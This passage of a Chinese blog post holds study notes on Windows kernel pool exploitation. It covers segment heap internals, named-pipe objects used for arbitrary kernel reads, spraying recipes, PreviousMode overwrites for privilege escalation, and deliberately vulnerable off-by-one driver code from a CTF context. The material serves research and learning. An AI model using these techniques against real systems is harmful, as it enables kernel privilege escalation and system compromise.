class="number">0</span>y0</span><br><span class="line">   +<span class="number">0x008</span> Spare            : <span class="number">0</span>y0000000000000000000000 (<span class="number">0</span>)</span><br><span class="line">   +<span class="number">0x008</span> AllocatedChunkBits : <span class="number">0x49</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dx -id <span class="number">0</span>,<span class="number">0</span>,ffff998520ad7080 -<span class="built_in">r1</span> (*((ntdll!_HEAP_VS_CHUNK_HEADER_SIZE *)<span class="number">0xffff998533f74440</span>))</span><br><span class="line">(*((ntdll!_HEAP_VS_CHUNK_HEADER_SIZE *)<span class="number">0xffff998533f74440</span>))                 [Type: _HEAP_VS_CHUNK_HEADER_SIZE]</span><br><span class="line">    [+<span class="number">0x000</span> (<span class="number">15</span>: <span class="number">0</span>)] MemoryCost       : <span class="number">0x7045</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span> (<span class="number">31</span>:<span class="number">16</span>)] UnsafeSize       : <span class="number">0x7e50</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x004</span> (<span class="number">15</span>: <span class="number">0</span>)] UnsafePrevSize   : <span class="number">0x4e1e</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x004</span> (<span class="number">23</span>:<span class="number">16</span>)] Allocated        : <span class="number">0xa7</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] KeyUShort        : <span class="number">0x7045</span> [Type: <span class="type">unsigned</span> <span class="type">short</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] KeyULong         : <span class="number">0x7e507045</span> [Type: <span class="type">unsigned</span> <span class="type">long</span>]</span><br><span class="line">    [+<span class="number">0x000</span>] HeaderBits       : <span class="number">0x88a74e1e7e507045</span> [Type: <span class="type">unsigned</span> __int64]</span><br></pre></td></tr></table></figure>

<p>在内部，VS分配器使用段分配器。它通过<code>_HEAP_VS_CONTXT</code>中的<code>_HEAP_SUBALLOCATOR_CALLBACKS</code>字段在<code>RtlpHpVsSubsegmentCreate</code>中使用。<strong>子分配器回调函数都与VS上下文和RtlpHpHeapGlobals地址进行异或</strong>。  </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">callbacks.Allocate = RtlpHpSegVsAllocate;</span><br><span class="line">callbacks.Free = RtlpHpSegLfhVsFree;</span><br><span class="line">callbacks.Commit = RtlpHpSegLfhVsCommit;</span><br><span class="line">callbacks.Decommit = RtlpHpSegLfhVsDecommit;</span><br><span class="line">callbacks.ExtendContext = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<h5 id="Low-Fragmentation-Heap-Backend"><a href="#Low-Fragmentation-Heap-Backend" class="headerlink" title="Low Fragmentation Heap Backend"></a>Low Fragmentation Heap Backend</h5><p>Low Fragmentation Heap Backend是一个后端，专门为从1B ~ 512 B 分配。LFH后端上下文存储在_HEAP_LFH_CONTEXT的结构体中。LFH后端的主要特点是使用不同大小的bucket来避免碎片化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd &gt; dt nt! _HEAP_LFH_CONTEXT</span><br><span class="line">+<span class="number">0</span> x000 BackendCtx : Ptr64 Void</span><br><span class="line">+<span class="number">0</span> x008 Callbacks : _HEAP_SUBALLOCATOR_CALLBACKS</span><br><span class="line">+<span class="number">0</span> x030 AffinityModArray : Ptr64 UChar</span><br><span class="line">+<span class="number">0</span> x038 MaxAffinity : UChar</span><br><span class="line">+<span class="number">0</span> x039 LockType : UChar</span><br><span class="line">+<span class="number">0</span> x03a MemStatsOffset : Int2B</span><br><span class="line">+<span class="number">0</span> x03c Config : _RTL_HP_LFH_CONFIG</span><br><span class="line">+<span class="number">0</span> x040 BucketStats : _HEAP_LFH_SUBSEGMENT_STATS</span><br><span class="line">+<span class="number">0</span> x048 SubsegmentCreationLock : Uint8B</span><br><span class="line">+<span class="number">0</span> x080 Buckets : [<span class="number">129</span>] Ptr64 _HEAP_LFH_BUCKET</span><br></pre></td></tr></table></figure>

<h5 id="缓存对齐"><a href="#缓存对齐" class="headerlink" title="缓存对齐"></a>缓存对齐</h5><p>随着内核层堆分配器的更新，<code>_POOL_HEADER</code>的大部分字段都是无用的</p>
<p>但是PoolTag和PoolType都是比较重要的</p>
<p>调用了ExAllocatePoolWithTag时,如果PoolType设置了CacheAligned,那么返回的内存将是与缓存行大小对齐的,这个值取决于cpu,通常为0x40。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PagedPoolCacheAligned = <span class="number">0</span>n5</span><br><span class="line">NonPagedPoolCacheAligned = <span class="number">0</span>n4</span><br></pre></td></tr></table></figure>

<p>如果分配的地址没有正确的对齐，那么块可能会有两个headers。</p>
<h4 id="Generic-Exploitation"><a href="#Generic-Exploitation" class="headerlink" title="Generic Exploitation"></a>Generic Exploitation</h4><p>堆溢出，幽灵块，这里介绍了的攻击方式，都是NamedPipe，分别在PagedPool和NonPagedPool中</p>
<h5 id="PipeAttribute"><a href="#PipeAttribute" class="headerlink" title="PipeAttribute"></a>PipeAttribute</h5><p>BigPool: 分配必须足够大(x64上为4064+字节)才能在大池中处理</p>
<p>论文中介绍了PagedPool的比较好用的任意读写的方法：PipeAttribute</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeAttribute</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    <span class="type">char</span> *AttributeName;</span><br><span class="line">    <span class="type">uint64_t</span> AttributeValueSize;</span><br><span class="line">    <span class="type">char</span> *AttributeValue;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>分配的大小和数据完全由攻击者控制。<code>AttributeName</code>和<code>AttributeValue</code>是指向数据字段的不同偏移的指针。 可以使用<code>NtFsControlFile</code>系统调用和<code>0x11003C</code>控制码在管道上创建管道属性，如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HANDLE read_pipe;</span><br><span class="line">HANDLE write_pipe;</span><br><span class="line"><span class="type">char</span> attribute[] = <span class="string">&quot; attribute_name \00 attribute_value &quot;</span>;</span><br><span class="line"><span class="type">char</span> output[<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">CreatePipe</span>(read_pipe, write_pipe, <span class="literal">NULL</span>, bufsize);</span><br><span class="line"><span class="built_in">NtFsControlFile</span>(write_pipe,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                &amp;status,</span><br><span class="line">                <span class="number">0x11003C</span>,</span><br><span class="line">                attribute,</span><br><span class="line">                <span class="built_in">sizeof</span>(attribute),</span><br><span class="line">                output,</span><br><span class="line">                <span class="built_in">sizeof</span>(output));</span><br></pre></td></tr></table></figure>

<p>然后可以使用<code>0x110038</code>控制码读取属性的值。<code>AttributeValue</code>指针和<code>AttributeValueSize</code>将用于读取属性的值并将其返回给用户。属性的值可以更改，但这将触发先前<code>PipeAttribute</code>的释放和新分配。</p>
<p>这意味着如果攻击者能够控制<code>PipeAttribute</code>的<code>AttributeValue</code>和<code>AttributeValueSize</code>字段，它可以在内核中读取任意数据，但不能任意写入。该对象还可以用于在内核中放置任意数据。这意味着它可以用于重新分配易受攻击块并控制幽灵块的内容。</p>
<h5 id="NpFr"><a href="#NpFr" class="headerlink" title="NpFr"></a>NpFr</h5><p>WriteFile写NamedPipe会获得chunk，也是可以造成任意读，只要能控制<code>Irp</code>和<code>isDataInKernel</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeQueueEntry</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    IRP *linkedIRP;</span><br><span class="line">    __int64 SecurityClientContext;</span><br><span class="line">    <span class="type">int</span> isDataInKernel;</span><br><span class="line">    <span class="type">int</span> remaining_bytes__;</span><br><span class="line">    <span class="type">int</span> DataSize;</span><br><span class="line">    <span class="type">int</span> field_2C;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读pipe</span></span><br><span class="line"><span class="keyword">if</span> (PipeQueueEntry-&gt;isDataAllocated == <span class="number">1</span>)</span><br><span class="line">    data_ptr = (PipeQueueEntry-&gt;linkedIRP-&gt;SystemBuffer);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    data_ptr = PipeQueueEntry-&gt;data;</span><br><span class="line">[...] </span><br><span class="line"><span class="built_in">memmove</span>((<span class="type">void</span> *)(dst_buf + dst_len - cur_read_offset), &amp;data_ptr[PipeQueueEntry-&gt;DataSize - cur_entry_offset], copy_size);</span><br></pre></td></tr></table></figure>

<h4 id="spray"><a href="#spray" class="headerlink" title="spray"></a>spray</h4><p>为了获得第所需的内存布局，需要进行一些spray。spray取决于易受攻击的块的大小，因为它将最终分配到不同的分配后端。</p>
<p>为了简化spray过程，可以确保相应的<code>lookaside</code>为空。分配超过256个相同大小的块将确保这一点。</p>
<p>如果易受攻击的块小于0x200，则它将位于LFH（低碎片化堆）后端。然后，spray应该使用完全相同大小的块进行，对应桶的粒度取模，以确保它们都从同一个桶中分配。当请求分配时，LFH后端将按照最多32个块的组进行扫描<code>BlockBitmap</code>，并随机选择一个空闲块。在易受攻击的块分配之前和之后分配超过32个块应有助于打败随机化。</p>
<p>如果易受攻击的块大于<code>0x200</code>但小于<code>0x10000</code>，则它将位于可变大小（Variable Size）后端。然后，spray应该使用与易受攻击的块大小相等的大小进行。较大的块可能会被拆分，从而导致喷洒失败。首先，分配数千个所选大小的块，以确保首先将<code>FreeChunkTree</code>中大于所选大小的所有块清空，然后分配器将分配一个新的<code>0x10000</code>字节的VS子段并将其放入<code>FreeChunkTree</code>中。然后分配另外数千个块，它们将最终位于新的大空闲块中，从而连续。然后释放最后分配块的三分之一，以填充<code>FreeChunkTree</code>。只释放三分之一将确保不会合并任何块。然后让易受攻击的块分配。</p>
<p>最后，可以重新分配已释放的块以最大化喷洒机会。</p>
<p>由于完整的利用技术需要释放和重新分配易受攻击的块和幽灵块，为了方便释放块的恢复，启用相应的动态<code>lookaside</code>非常有趣。为此，一个简单的解决方案是分配数千个相应大小的块，等待2秒钟，然后再分配数千个块并等待1秒钟。这样，我们可以确保平衡集管理器已经重新平衡了相应的<code>lookaside</code>。分配数千个块确保<code>lookaside</code>将成为最常用的<code>lookaside</code>，并且将被启用，并且还确保它在其中有足够的空间。</p>
<h4 id="IO-Ring"><a href="#IO-Ring" class="headerlink" title="IO Ring"></a>IO Ring</h4><p>win11不错的漏洞利用对象。</p>
<p>复现了相关CVE：<a href="https://github.com/Ha0-Y/CVE-2023-21768">CVE-2023-21768 Proof of Concept</a></p>
<h4 id="PreviousMode"><a href="#PreviousMode" class="headerlink" title="PreviousMode"></a>PreviousMode</h4><p>修改<code>_KTHREAD.PreviousMode</code>字段。</p>
<p>用户态程序调用系统的 Nt 或 Zw 时，系统调用机制会将调用线程捕获到内核模式。 为了标识参数源自用户模式，系统调用的处理程序将调用方线程对象中的 PreviousMode 字段设置为 UserMode。  </p>
<p>而内核态程序调用系统例程并将参数值传递给来自内核态的例程，当前线程对象中的 PreviousMode 字段应为 KernelMode。 </p>
<p>系统会检查调用线程的 PreviousMode 字段。这样通过参数就可以知道是来自用户态还是内核态了。</p>
<p>所以当 PreviousMode 设置为 1 时，来自用户空间的NT 或 Zw 版本函数调用将其中进行地址验证。在这种情况下，对内核内存的任意写将失败，因为此时PreviousMode是用户态的状态。当 PreviousMode 设置为 0 (此时是内核态) 时，将跳过地址验证写入任意内核内存地址，从而完成提权。</p>
<p>当我们替换<code>PreviousMode</code>为<code>0</code>后，这意味着我们可以使用<code>NtWriteVirtualMemory</code>在整个内核内存中进行不受约束的RW。</p>
<ul>
<li><code>NtReadVirtualMemory</code> 和 <code>NtWriteVirtualMemory</code> 调用函数相同（<code>MiReadWriteVirtualMemory</code>），因此在一定方面 NtWriteVirtualMemory 也可以任意读</li>
</ul>
<h4 id="New"><a href="#New" class="headerlink" title="New"></a>New</h4><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/updating-deprecated-exallocatepool-calls">ExAllocatePool2 和 ExAllocatePool3 </a>，在低版本的Windows系统中会导致无法加载驱动🤣</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DECLSPEC_RESTRICT PVOID <span class="title">ExAllocatePool2</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  POOL_FLAGS Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T     NumberOfBytes,</span></span></span><br><span class="line"><span class="params"><span class="function">  ULONG      Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Old code</span></span><br><span class="line">PVOID Allocation = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">100</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(Allocation, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// New code</span></span><br><span class="line">PVOID Allocation = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_PAGED, <span class="number">100</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="NPFS-SYS"><a href="#NPFS-SYS" class="headerlink" title="NPFS.SYS"></a>NPFS.SYS</h3><p>named pipe file system，常见的结构体</p>
<p>这一篇文章：<a href="https://bbs.kanxue.com/thread-278483.htm#msg_header_h2_4">新型Windows内核池风水利用工具研究</a></p>
<ul>
<li>命名管道的后端实现在一个名为NPFS.SYS驱动中，模块的主要实现和公开的<a href="https://doxygen.reactos.org/dir_552a77878df93326bbe516beefdc08b2.html">npfs模块reactos源码</a>基本上大致相同。</li>
</ul>
<h4 id="DATA-QUEUE-ENTRY"><a href="#DATA-QUEUE-ENTRY" class="headerlink" title="DATA_QUEUE_ENTRY"></a>DATA_QUEUE_ENTRY</h4><p>Queue: 双向链表</p>
<p>SecurityContext</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">nt!_SECURITY_CLIENT_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SecurityQos      : _SECURITY_QUALITY_OF_SERVICE</span><br><span class="line">   +<span class="number">0x010</span> ClientToken      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x018</span> DirectlyAccessClientToken : UChar</span><br><span class="line">   +<span class="number">0x019</span> DirectAccessEffectiveOnly : UChar</span><br><span class="line">   +<span class="number">0x01a</span> ServerIsRemote   : UChar</span><br><span class="line">   +<span class="number">0x01c</span> ClientTokenControl : _TOKEN_CONTROL</span><br></pre></td></tr></table></figure>

<p>EntryType</p>
<ul>
<li>Buffered Entries：这个值为0，当调用ReadFile时从<code>DATA_QUEUE_ENTRY.data</code>读取数据</li>
<li>Unbuffered Entries: 值为1，当调用ReadFile时从<code>DATA_QUEUE_ENTRY.Irp-&gt;AssociatedIrp.SystemBuffer</code>读取数据</li>
</ul>
<p><strong>QuotaInEntry</strong>: 被消耗</p>
<ul>
<li>buffered entries,：开始是DataSize，每当读取一次，就会较少，直到0</li>
<li>unbuffered entries：0</li>
</ul>
<p><strong>DataSize</strong>: user data的长度</p>
<p>x: padding</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DATA_QUEUE_ENTRY</span>&#123;</span><br><span class="line">    LIST_ENTRY Queue;   </span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    _SECURITY_CLIENT_CONTEXT* SecurityContext;</span><br><span class="line">    <span class="type">int</span> EntryType;</span><br><span class="line">    <span class="type">int</span> QuotaInEntry;</span><br><span class="line">    <span class="type">int</span> DataSize;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">&#125; DATA_QUEUE_ENTRY,*PDATA_QUEUE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_NP_DATA_QUEUE</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY Queue;</span><br><span class="line">    ULONG QueueState;</span><br><span class="line">    ULONG BytesInQueue;</span><br><span class="line">    ULONG EntriesInQueue;</span><br><span class="line">    ULONG QuotaUsed;</span><br><span class="line">    ULONG ByteOffset;</span><br><span class="line">    ULONG Quota;</span><br><span class="line">&#125; NP_DATA_QUEUE, *PNP_DATA_QUEUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//nSize指定了pipe的最大容量</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hReadPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hWritePipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>通过<code>CreatePipe</code>创建命名管道文件对象，文件实例绑定了一个名为NP_DATA_QUEUE类型的队列对象</p>
<p>CreatePipe的参数nSize指定了当前pipe的最大容量或者说是允许最大缓冲区长度,每对pipe进行一次读写操作就会增加一个DATA_QUEUE_ENTRY。</p>
<p>若干次写可以对应若干次读,当存在读数据的请求时irp就会挂起,直到写入请求的数据量达到读取请求的数据量才会完成整个读取irp请求,比如说pipe的容量是1000,第一次写了1000的数据,这个写请求会返回,第二次又写了1000数据那么这个请求就一直挂起,直到读取了1000数据后,最后写入的数据小于或等于pipe的容量,后面写请求才会返回.</p>
<h4 id="npfs-NpAddDataQueueEntry"><a href="#npfs-NpAddDataQueueEntry" class="headerlink" title="npfs!NpAddDataQueueEntry"></a>npfs!NpAddDataQueueEntry</h4><p>可以下断点😋</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_REQUIRED_START 0x0000000000000001UI64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_USE_QUOTA 0x0000000000000001UI64 <span class="comment">// Charge quota</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_NON_PAGED 0x0000000000000040UI64 <span class="comment">// Non paged pool NX</span></span></span><br><span class="line"><span class="keyword">if</span> ( !a5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = Size + <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)Size + <span class="number">0x30</span> &lt; (<span class="type">unsigned</span> <span class="type">int</span>)Size )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">NpFreeClientSecurityContext</span>(v12);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xC000000D</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = *(_DWORD *)(a3 + <span class="number">28</span>) - *(_DWORD *)(a3 + <span class="number">32</span>);</span><br><span class="line">    v15 = Size - a9;</span><br><span class="line">    <span class="keyword">if</span> ( v24 &lt; (<span class="type">int</span>)Size - a9 )</span><br><span class="line">      v15 = *(_DWORD *)(a3 + <span class="number">28</span>) - *(_DWORD *)(a3 + <span class="number">32</span>);</span><br><span class="line">    v26 = v15;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">0x30</span> &amp;&amp; _interlockedbittestandreset((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)(a3 + <span class="number">40</span>), <span class="number">0</span>) )</span><br><span class="line">      v16 = *(_QWORD *)(a3 + <span class="number">40</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v16 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    v16 = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x41</span>i64, v14, <span class="string">&#x27;rFpN&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = v26;</span><br><span class="line">LABEL_14:</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">36</span>) = v15;</span><br><span class="line">      *(_QWORD *)(v16 + <span class="number">16</span>) = v13;</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(v16 + <span class="number">24</span>) = v12;</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">40</span>) = Size;</span><br><span class="line">      <span class="keyword">if</span> ( a4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v13 )</span><br><span class="line">          v22 = *(<span class="type">const</span> <span class="type">void</span> **)(v13 + <span class="number">112</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v22 = a8;</span><br><span class="line">        <span class="built_in">memmove</span>((<span class="type">void</span> *)(v16 + <span class="number">48</span>), v22, (<span class="type">unsigned</span> <span class="type">int</span>)Size);</span><br><span class="line">        <span class="keyword">if</span> ( v24 &lt; (<span class="type">int</span>)Size - a9 &amp;&amp; v13 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = <span class="number">259</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)(v16 + <span class="number">16</span>) = <span class="number">0</span>i64;</span><br><span class="line">          v17 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">259</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_51:</span><br><span class="line">    <span class="built_in">NpFreeClientSecurityContext</span>(v12);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225626</span>i64;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="NonPagedPool-Overflow"><a href="#NonPagedPool-Overflow" class="headerlink" title="NonPagedPool Overflow"></a>NonPagedPool Overflow</h3><p><a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows-Non-Paged-Pool-Overflow-Exploitation</a></p>
<p>有源码以及详细的利用手法。</p>
<p>溢出覆盖一字节，也分别给出两种利用手段的exp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">Al20c</span><span class="params">(<span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">		buf[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">All0c</span><span class="params">(<span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">		buf[i] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>展示如何创建unbuffered pipe</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSYSCALLAPI NTSTATUS <span class="title">NtFsControlFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  HANDLE           Event,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PIO_APC_ROUTINE  ApcRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PVOID            ApcContext,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]           PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            FsControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PVOID            InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            InputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PVOID            OutputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            OutputBufferLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//create the pipe/file in FILE_FLAG_OVERLAPPED mode (blocking mode)</span></span><br><span class="line"><span class="built_in">NtFsControlFile</span>(pipe_handle, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;isb, <span class="number">0x119FF8</span>, buf, sz, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h4 id="溢出数据足够多"><a href="#溢出数据足够多" class="headerlink" title="溢出数据足够多"></a>溢出数据足够多</h4><p>可以控制整个 DATA_QUEUE_ENTRY</p>
<p>IRP任意读</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry=whatever;</span><br><span class="line"> Irp=Forged IRP Address;</span><br><span class="line"> SecurityContext=ideally <span class="number">0</span>;</span><br><span class="line"> EntryType=<span class="number">1</span>;  <span class="comment">// unbuffered</span></span><br><span class="line"> QuotaInEntry=ideally <span class="number">0</span>;</span><br><span class="line"> DataSize=arbitrary read size;</span><br><span class="line"> x=whatever;</span><br><span class="line"> </span><br><span class="line">IRP-&gt;SystemBuffer = arbitrary read address</span><br></pre></td></tr></table></figure>

<p>修改DataSize越界读</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry=whatever;</span><br><span class="line"> Irp=ideally <span class="number">0</span>;</span><br><span class="line"> SecurityContext=ideally <span class="number">0</span>;</span><br><span class="line"> EntryType=<span class="number">0</span>;</span><br><span class="line"> QuotaInEntry=ideally <span class="number">0</span>; <span class="comment">//mostly irrelevent in case we use the peek operation</span></span><br><span class="line"> DataSize=something bigger than the original size;</span><br><span class="line"> x=whatever;</span><br></pre></td></tr></table></figure>

<p>相关利用：<a href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">HITCON 2020 lucifer</a></p>
<h4 id="溢出长度比较小"><a href="#溢出长度比较小" class="headerlink" title="溢出长度比较小"></a>溢出长度比较小</h4><p>结构体第一个元素Queue，是一个双向链表</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>这样是可以修改链表的指向，指向其余的DATA_QUEUE_ENTRY，但是windows存在安全机制，检查<code>entry-&gt;Flink-&gt;Blink!=entry</code></p>
<p>我们可以使用<code>PeekNamedPipe</code> 读取而不释放</p>
<h4 id="overflow-任意地址写"><a href="#overflow-任意地址写" class="headerlink" title="overflow-&gt;任意地址写"></a>overflow-&gt;任意地址写</h4><p>1字节溢出</p>
<h3 id="HITCON-2020-lucifer"><a href="#HITCON-2020-lucifer" class="headerlink" title="HITCON 2020 lucifer"></a>HITCON 2020 lucifer</h3><p><a href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">lucifer</a>：Windows 10 Pro 20H2，一个非常低的权限运行 <code>cmd.exe</code></p>
<p>OOB write，angleboy还带有相关PPT，看PPT</p>
<p>四个功能，经典菜单堆</p>
<p>首先是Create：在NonPagedPoolNx创建0x400大小的chunk</p>
